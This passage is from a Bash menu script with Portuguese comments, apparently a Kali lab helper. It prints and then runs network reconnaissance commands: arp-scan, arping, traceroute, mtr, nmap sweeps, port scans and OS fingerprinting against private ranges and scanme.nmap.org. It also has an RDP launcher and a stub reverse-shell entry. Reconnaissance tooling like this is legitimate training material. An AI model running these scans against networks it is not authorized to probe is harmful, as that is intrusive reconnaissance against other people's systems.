            print_arpscan_submenu # Imprime o submenu de Arp-scan

            # Solicitação para escolher uma opção do submenu
            echo -ne "${YELLOW}Digite o número da opção desejada: ${NC}"
            read -r arp_scan_option
            print_line "${PURPLE}" 0 1

            # Caso para cada opção do submenu do Arp-scan
            case $arp_scan_option in
                1)
                    echo -e "Este comando lista todos os hosts na rede local."
                    echo -e "${RED}sudo arp-scan -I eth0 192.168.74.0/24"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    sudo arp-scan -I eth0 192.168.74.0/24
                    ;;
                2)
                    echo -e "Este comando lista todos os hosts na rede local passivamente."
                    echo -e "${RED}sudo arp-scan -I eth0 -l"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    sudo arp-scan -I eth0 -l
                    ;;
                3)
                    echo -e "Este comando lista todos os hosts na rede local para impressão."
                    echo -e "${RED}sudo arp-scan -I eth0 -l -q"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    sudo arp-scan -I eth0 -l -q
                    ;;
                4)
                    echo -e "Este comando lista todos os hosts na rede local para impressão de forma silenciosa."
                    echo -e "${RED}sudo arp-scan -I eth0 -l -x"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    sudo arp-scan -I eth0 -l -x
                    ;;
                6)
                    echo -e "Este comando lista todos os hosts na rede local a partir de um arquivo de endereços IP."
                    echo -e "${RED}sudo arp-scan -I eth0 -f arp-scan/ips.txt"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    sudo arp-scan -I eth0 -f arp-scan/ips.txt
                    ;;
                0)
                    break # Retorna ao submenu Networking Tracing
                    ;;
                *)
                    center_line "${RED}" "Opção inválida. Por favor, escolha uma opção válida"
                    ;;
            esac
            print_line "${PURPLE}" 0 1
            center_line "${YELLOW}" "Pressione ENTER para voltar ao submenu Arp-scan..."
            read -r
        done
    }

    # Função para o submenu de Arping
    arping_submenu() {
        while true; do
            clear # Limpa a tela
            print_arping_submenu # Imprime o submenu de Arping

            # Solicitação para escolher uma opção do submenu
            echo -ne "${YELLOW}Digite o número da opção desejada: ${NC}"
            read -r arping_option
            print_line "${PURPLE}" 0 1

            # Caso para cada opção do submenu de Arping
            case $arping_option in
                1)
                    echo -e "Este comando envia pacotes ARP para 192.168.74.1."
                    echo -e "${RED}sudo arping 192.168.74.1"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    sudo arping 192.168.74.1
                    ;;
                2)
                    echo -e "Este comando envia 5 pacotes ARP para 192.168.74.1."
                    echo -e "${RED}sudo arping -c5 192.168.74.1"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    sudo arping -c5 192.168.74.1
                    ;;
                3)
                    echo -e "Este comando envia 5 pacotes ARP para 192.168.74.1 com vermose nível 1."
                    echo -e "${RED}sudo arping -c5 192.168.74.1 -v"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    sudo arping -c5 192.168.74.1 -v
                    ;;
                4)
                    echo -e "Este comando envia 5 pacotes ARP para 192.168.74.1 com vermose nível 2."
                    echo -e "${RED}sudo arping -c5 192.168.74.1 -vv"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    sudo arping -c5 192.168.74.1 -vv
                    ;;
                5)
                    echo -e "Este comando envia 5 pacotes ARP para 192.168.74.1 com vermose nível 3."
                    echo -e "${RED}sudo arping -c5 192.168.74.1 -vvv"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    sudo arping -c5 192.168.74.1 -vvv
                    ;;
                6)
                    echo -e "Este comando envia 5 pacotes ARP para 192.168.100.100 com opção para procurar IPs duplicados."
                    echo -e "${RED}sudo arping -c5 192.168.100.100 -d; echo \"Código de saída: \$?\""
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    sudo arping -c5 192.168.100.100 -d; echo "Código de saída: $?"
                    ;;
                0)
                    break # Retorna ao submenu Networking Tracing
                    ;;
                *)
                    center_line "${RED}" "Opção inválida. Por favor, escolha uma opção válida"
                    ;;
            esac
            print_line "${PURPLE}" 0 1
            center_line "${YELLOW}" "Pressione ENTER para voltar ao submenu Arping..."
            read -r
        done
    }

    # Função para o submenu de Traceroute
    traceroute_submenu() {
        while true; do
            clear # Limpa a tela
            print_traceroute_submenu # Imprime o submenu de Traceroute

            # Solicitação para escolher uma opção do submenu
            echo -ne "${YELLOW}Digite o número da opção desejada: ${NC}"
            read -r traceroute_option
            print_line "${PURPLE}" 0 1

            # Caso para cada opção do submenu de Traceroute
            case $traceroute_option in
                1)
                    echo -e "Este comando executa um traceroute para scanme.org."
                    echo -e "${RED}traceroute scanme.org"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    traceroute scanme.org
                    ;;
                2)
                    echo -e "Este comando executa um traceroute para scanme.org com pacotes TCP SYN. É necessário usuário com privilégio de root."
                    echo -e "${RED}sudo traceroute scanme.org -T"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    sudo traceroute scanme.org -T
                    ;;
                3)
                    echo -e "Este comando executa um traceroute para scanme.org usando ICMP Echo Request. É necessário usuário com privilégio de root."
                    echo -e "${RED}sudo traceroute scanme.org -I"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    sudo traceroute scanme.org -I
                    ;;
                4)
                    echo -e "Este comando executa um traceroute para scanme.org com limite de TTL 10 e intervalo de 0.5 segundos."
                    echo -e "${RED}traceroute scanme.org -f 10 -z 0.5"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    traceroute scanme.org -f 10 -z 0.5
                    ;;
                5)
                    echo -e "Este comando executa um traceroute para scanme.org especificando a interface de origem e mostrando IPs em vez de nomes de host."
                    echo -e "${RED}traceroute scanme.org -i eth0 -n"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    traceroute scanme.org -i eth0 -n
                    ;;
                6)
                    echo -e "Este comando executa um traceroute para scanme.org com limite máximo de saltos 15 e tempo limite de resposta de 0.3 segundos."
                    echo -e "${RED}traceroute scanme.org -m 15 -w 0.3"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    traceroute scanme.org -m 15 -w 0.3
                    ;;
                0)
                    break # Retorna ao submenu Networking Tracing
                    ;;
                *)
                    center_line "${RED}" "Opção inválida. Por favor, escolha uma opção válida"
                    ;;
            esac
            print_line "${PURPLE}" 0 1
            center_line "${YELLOW}" "Pressione ENTER para voltar ao submenu Traceroute..."
            read -r
        done
    }

    # Função para o submenu de MTR
    mtr_submenu() {
        while true; do
            clear # Limpa a tela
            print_mtr_submenu # Imprime o submenu de MTR

            # Solicitação para escolher uma opção do submenu
            echo -ne "${YELLOW}Digite o número da opção desejada: ${NC}"
            read -r mtr_option
            print_line "${PURPLE}" 0 1

            # Caso para cada opção do submenu de MTR
            case $mtr_option in
                1)
                    echo -e "Este comando executa um MTR para scanme.org (Default)."
                    echo -e "${RED}mtr scanme.org -t"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    mtr scanme.org -t
                    ;;
                2)
                    echo -e "Este comando executa um MTR para scanme.org para impressão sem resolução de DNS."
                    echo -e "${RED}mtr scanme.org -t -r -n"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    mtr scanme.org -t -r -n
                    ;;
                3)
                    echo -e "Este comando executa um MTR para scanme.org com UDP."
                    echo -e "${RED}mtr scanme.org -t -u"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    mtr scanme.org -t -u
                    ;;
                4)
                    echo -e "Este comando executa um MTR para scanme.org com TCP."
                    echo -e "${RED}mtr scanme.org -t -T"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    mtr scanme.org -t -T
                    ;;
                5)
                    echo -e "Este comando executa um MTR para scanme.org com interface gráfica."
                    echo -e "${RED}mtr scanme.org -g"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    mtr scanme.org -g
                    ;;
                0)
                    break # Retorna ao submenu Networking Tracing
                    ;;
                *)
                    center_line "${RED}" "Opção inválida. Por favor, escolha uma opção válida"
                    ;;
            esac
            print_line "${PURPLE}" 0 1
            center_line "${YELLOW}" "Pressione ENTER para voltar ao submenu MTR..."
            read -r
        done
    }

    # Função para o submenu de Networking Sweeping
    networking_sweeping_submenu() {
        while true; do
            clear # Limpa a tela
            print_networking_sweeping_submenu # Imprime o submenu de Networking Sweeping

            # Solicitação para escolher uma opção do submenu
            echo -ne "${YELLOW}Digite o número da opção desejada: ${NC}"
            read -r sweeping_option
            print_line "${PURPLE}" 0 1

            # Caso para cada opção do submenu de Networking Sweeping
            case $sweeping_option in
                1)
                    echo -e "Este comando realiza um ping sweep (ICMP Echo Request) na rede 192.168.74.0/24."
                    echo -e "${RED}nmap -sn 192.168.74.0/24"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    nmap -sn 192.168.74.0/24
                    ;;
                2)
                    echo -e "Este comando realiza um ping sweep (ICMP Echo Request) com ARP Request na rede 192.168.74.0/24."
                    echo -e "${RED}sudo nmap -PE 192.168.74.0/24"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    sudo nmap -PE 192.168.74.0/24
                    ;;
                3)
                    echo -e "Este comando realiza um TCP SYN Ping Sweep na rede 192.168.74.0-255."
                    echo -e "${RED}nmap -sn -PS 192.168.74.0-255"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    nmap -sn -PS 192.168.74.0-255
                    ;;
                4)
                    echo -e "Este comando realiza um ACK Ping Sweep na rede 192.168.74.0-255."
                    echo -e "${RED}nmap -sn -PA 192.168.74.0-255"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    nmap -sn -PA 192.168.74.0-255
                    ;;
                5)
                    echo -e "Este comando realiza um UDP Ping Sweep na rede 192.168.74.0-255."
                    echo -e "${RED}sudo nmap -sn -PU 192.168.74.0-255"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    sudo nmap -sn -PU 192.168.74.0-255
                    ;;
                0)
                    break # Retorna ao menu principal
                    ;;
                *)
                    center_line "${RED}" "Opção inválida. Por favor, escolha uma opção válida"
                    ;;
            esac
            print_line "${PURPLE}" 0 1
            center_line "${YELLOW}" "Pressione ENTER para voltar ao submenu Networking Sweeping..."
            read -r
        done
    }

    # Função para o submenu de Port Scanning
    port_scanning_submenu() {
        while true; do
            clear # Limpa a tela
            print_port_scanning_submenu # Imprime o submenu de Port Scanning

            # Solicitação para escolher uma opção do submenu
            echo -ne "${YELLOW}Digite o número da opção desejada: ${NC}"
            read -r port_scanning_option
            print_line "${PURPLE}" 0 1

            # Caso para cada opção do submenu de Port Scanning
            case $port_scanning_option in
                1)
                    echo -e "Este comando realiza um scan básico no scanme.nmap.org."
                    echo -e "${RED}nmap scanme.nmap.org"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    nmap scanme.nmap.org
                    ;;
                2)
                    echo -e "Este comando realiza um scan TCP SYN no scanme.nmap.org."
                    echo -e "${RED}sudo nmap -sS -T4 -p- scanme.nmap.org"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    sudo nmap -sS -T4 -p- scanme.nmap.org
                    ;;
                3)
                    echo -e "Este comando realiza um scan com detecção de serviço no scanme.nmap.org."
                    echo -e "${RED}nmap -A -p 22,80,443 scanme.nmap.org"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    nmap -A -p 22,80,443 scanme.nmap.org
                    ;;
                4)
                    echo -e "Este comando realiza um scan UDP no scanme.nmap.org."
                    echo -e "${RED}nmap -Pn -sU scanme.nmap.org"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    nmap -Pn -sU scanme.nmap.org
                    ;;
                5)
                    echo -e "Este comando realiza um scan nos 10 principais portas no scanme.nmap.org."
                    echo -e "${RED}nmap --top-ports 10 -T2 -v scanme.nmap.org"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    nmap --top-ports 10 -T2 -v scanme.nmap.org
                    ;;
                6)
                    echo -e "Este comando realiza um scan em um intervalo de portas em um intervalo de IPs."
                    echo -e "${RED}nmap -p 1-100 192.168.74.5-40"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    nmap -p 1-100 192.168.74.5-40
                    ;;
                7)
                    echo -e "Este comando realiza um scan em um intervalo de portas com detecção de serviço em uma rede."
                    echo -e "${RED}nmap -p 80,443 –sV 192.168.74.0/24"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    nmap -p 80,443 –sV 192.168.74.0/24
                    ;;
                8)
                    echo -e "Este comando realiza um scan em uma lista de IPs de um arquivo."
                    echo -e "${RED}nmap -p 80,443 -iL port-scanning/ips.txt"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    nmap -p 80,443 -iL port-scanning/ips.txt
                    ;;
                0)
                    break # Retorna ao menu principal
                    ;;
                *)
                    center_line "${RED}" "Opção inválida. Por favor, escolha uma opção válida"
                    ;;
            esac
            print_line "${PURPLE}" 0 1
            center_line "${YELLOW}" "Pressione ENTER para voltar ao submenu Port Scanning..."
            read -r
        done
    }

    # Função para o submenu de OS Fingerprint
    os_fingerprint_submenu() {
        while true; do
            clear # Limpa a tela
            print_os_fingerprint_submenu # Imprime o submenu de OS Fingerprint

            # Solicitação para escolher uma opção do submenu
            echo -ne "${YELLOW}Digite o número da opção desejada: ${NC}"
            read -r os_option
            print_line "${PURPLE}" 0 1

            # Caso para cada opção do submenu de OS Fingerprint
            case $os_option in
                1)
                    echo -e "Este comando executa OS Fingerprint para identificar o sistema operacional de scanme.org na porta 80."
                    echo -e "${RED}sudo nmap -O scanme.org -p 80"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    sudo nmap -O scanme.org -p 80
                    ;;
                2)
                    echo -e "Este comando executa OS Fingerprint para obter informações detalhadas sobre scanme.org na porta 80."
                    echo -e "${RED}nmap -A scanme.org -p 80"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    nmap -A scanme.org -p 80
                    ;;
                3)
                    echo -e "Este comando executa OS Fingerprint para uma análise abrangente de scanme.org na porta 80."
                    echo -e "${RED}sudo nmap -sS -sV --version-all scanme.org -p 80"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para executar o comando..."
                    read -r
                    clear
                    sudo nmap -sS -sV --version-all scanme.org -p 80
                    ;;
                0)
                    break # Retorna ao menu principal
                    ;;
                *)
                    print_line "${PURPLE}" 0 1
                    center_line "${RED}" "Opção inválida. Por favor, escolha uma opção válida"
                    print_line "${PURPLE}" 0 1
                    center_line "${YELLOW}" "Pressione ENTER para continuar..."
                    read -r
                    ;;
            esac
            print_line "${PURPLE}" 0 1
            center_line "${YELLOW}" "Pressione ENTER para voltar ao submenu OS Fingerprint..."
            read -r
        done
    }


    # Verifica se o script foi iniciado com privilégios de root
    if [ "$(id -u)" -ne 0 ]; then
        echo "Este script precisa ser executado com privilégios de root. Reiniciando com sudo..."
        sudo "$0" "$@"  # Reinicia o script com sudo
        exit $?  # Sai do script após reiniciar
    fi

    # Chamada da função do menu principal
    main_menu_code_sgt_domingues

}
#
function xxii_nmap_descoberta_de_rede(){
    local rede
    rede="$(ipcalc -n -b -n -b "$(ip -br a | grep tap | head -n 1 | awk '{print $3}')" | awk '/Network/ {print $2}')"
    cd /usr/share/nmap/scripts && nmap -sC -sV -vv -O $rede | tee /home/kali/nmap.txt
    echo ""
    pausa_script;
}
#
function xxiii_nmap(){
    echo "nmap"
}
#
function xxiv_revshell_windows(){
    echo "revshell_windows"
}
#
function xxv_rdp_windows(){
    echo -n "Insira o IP do host windows: "
    read -r  IP_HOST
    echo -n "Insira o usuario: "
    read -r USER
    echo -n "Insira o password: "
    read -r PASSWD
    tilix --action=app-new-session --command="$(xfreerdp /u:"$USER" /p:"$PASSWD" /w:1366 /h:768 /v:"$IP_HOST" /smart-sizing +auto-reconnect)"
}
#
#============================================================

######## CHEGAGEM DE PARAMETROS & EXECUÇÃO DO MAIN_MENU ########
# Verifica se o número de argumentos passados para o script é diferente de zero.
# Check if the script is being run with root privileges #TODO:PT-BR
# If not, display an error message and exit with a non-zero status code #TODO:PT-BR
#Encerra todos os processos do openvpn
if [ "$(id -u)" != "0" ]; then
    msg_erro_root;
    # Check if the correct number of arguments is provided #TODO:PT-BR
    # If not, display a usage message and exit with a non-zero status code #TODO:PT-BR
    elif [ "$#" -ne 0 ]; then
        msg_erro_arquivo;
    else
        ######### Executa a função principal ########
        main_menu;
fi
#============================================================

#Extracting URLs from a Web Page - Web and Internet Users (177) - Chapter 7 - Wicked Cool Scripts
